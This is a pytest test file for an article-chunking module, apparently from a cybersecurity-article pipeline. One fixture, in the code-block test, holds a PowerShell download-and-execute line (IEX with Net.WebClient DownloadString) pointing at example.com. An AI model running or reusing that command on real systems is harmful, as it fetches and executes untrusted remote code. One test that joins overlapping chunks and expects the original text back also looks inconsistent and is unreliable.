"""
Tests for the chunker module.
"""

import pytest
from src.core.chunker import chunk_text, ArticleChunker


class TestChunker:
    """Test cases for the ArticleChunker class."""
    
    def test_chunk_text_single_chunk(self):
        """Test chunking short text that fits in one chunk."""
        text = "This is a short article about cybersecurity."
        chunks = chunk_text(1, text, size=100, overlap=20)
        
        assert len(chunks) == 1
        assert chunks[0]['text'] == text
        assert chunks[0]['start_offset'] == 0
        assert chunks[0]['end_offset'] == len(text)
        assert chunks[0]['article_id'] == 1
    
    def test_chunk_text_multiple_chunks(self):
        """Test chunking longer text into multiple chunks."""
        text = "This is a longer article about cybersecurity. " * 20  # ~600 characters
        chunks = chunk_text(1, text, size=200, overlap=50)
        
        assert len(chunks) > 1
        assert all(chunk['article_id'] == 1 for chunk in chunks)
        
        # Check that chunks cover the entire text
        assert chunks[0]['start_offset'] == 0
        assert chunks[-1]['end_offset'] == len(text)
        
        # Check for overlaps
        for i in range(len(chunks) - 1):
            current_chunk = chunks[i]
            next_chunk = chunks[i + 1]
            assert current_chunk['end_offset'] >= next_chunk['start_offset']
    
    def test_chunk_text_preserves_content(self):
        """Test that chunking preserves all content."""
        text = "This is a test article with multiple sentences. It should be preserved completely. No content should be lost during chunking."
        chunks = chunk_text(1, text, size=50, overlap=10)
        
        # Reconstruct text from chunks
        reconstructed = ""
        for chunk in chunks:
            reconstructed += chunk['text']
        
        # Remove extra whitespace and compare
        assert reconstructed.strip() == text.strip()
    
    def test_chunk_text_with_section_boundaries(self):
        """Test that chunking respects section boundaries."""
        text = """# Introduction
This is the introduction section.

## Technical Details
This section contains technical information about the attack.

### Code Example
```python
print("Hello, World!")
```

## Conclusion
This is the conclusion."""
        
        chunks = chunk_text(1, text, size=100, overlap=20)
        
        # Check that section headers are preserved
        section_headers = ["# Introduction", "## Technical Details", "### Code Example", "## Conclusion"]
        chunk_texts = [chunk['text'] for chunk in chunks]
        
        for header in section_headers:
            assert any(header in chunk_text for chunk_text in chunk_texts)
    
    def test_chunk_text_with_code_blocks(self):
        """Test that chunking preserves code blocks."""
        text = """This article discusses PowerShell attacks.

Here's an example:
```powershell
Invoke-Expression "IEX (New-Object Net.WebClient).DownloadString('http://example.com/payload')"
```

The attacker used this technique."""
        
        chunks = chunk_text(1, text, size=80, overlap=10)
        
        # Check that code block is preserved in at least one chunk
        code_block = "```powershell"
        chunk_texts = [chunk['text'] for chunk in chunks]
        assert any(code_block in chunk_text for chunk_text in chunk_texts)
    
    def test_chunk_text_validation(self):
        """Test chunk validation."""
        chunker = ArticleChunker()
        
        text = "This is a test article for validation."
        chunks = chunk_text(1, text, size=20, overlap=5)
        
        # Test validation
        assert chunker.validate_chunks(text, chunks) == True
        
        # Test with invalid chunks (gap)
        invalid_chunks = [
            {'start_offset': 0, 'end_offset': 10, 'text': text[:10]},
            {'start_offset': 15, 'end_offset': 25, 'text': text[15:25]}  # Gap at 10-15
        ]
        assert chunker.validate_chunks(text, invalid_chunks) == False
    
    def test_chunk_text_hash_uniqueness(self):
        """Test that different chunks have different hashes."""
        text = "This is a test article. " * 10
        chunks = chunk_text(1, text, size=50, overlap=10)
        
        hashes = [chunk['hash'] for chunk in chunks]
        assert len(hashes) == len(set(hashes))  # All hashes should be unique
    
    def test_chunk_text_metadata(self):
        """Test that chunk metadata is correctly set."""
        text = "This is a test article with some content."
        chunks = chunk_text(1, text, size=30, overlap=5)
        
        for chunk in chunks:
            assert 'metadata' in chunk
            assert 'word_count' in chunk['metadata']
            assert 'char_count' in chunk['metadata']
            assert 'chunk_type' in chunk['metadata']
            assert chunk['metadata']['word_count'] > 0
            assert chunk['metadata']['char_count'] > 0
    
    def test_chunk_text_edge_cases(self):
        """Test edge cases for chunking."""
        # Empty text
        chunks = chunk_text(1, "", size=100, overlap=20)
        assert len(chunks) == 0
        
        # Very short text
        chunks = chunk_text(1, "Hi", size=100, overlap=20)
        assert len(chunks) == 1
        assert chunks[0]['text'] == "Hi"
        
        # Text exactly at chunk size
        text = "A" * 100
        chunks = chunk_text(1, text, size=100, overlap=20)
        assert len(chunks) == 1
        assert chunks[0]['text'] == text


if __name__ == "__main__":
    pytest.main([__file__])
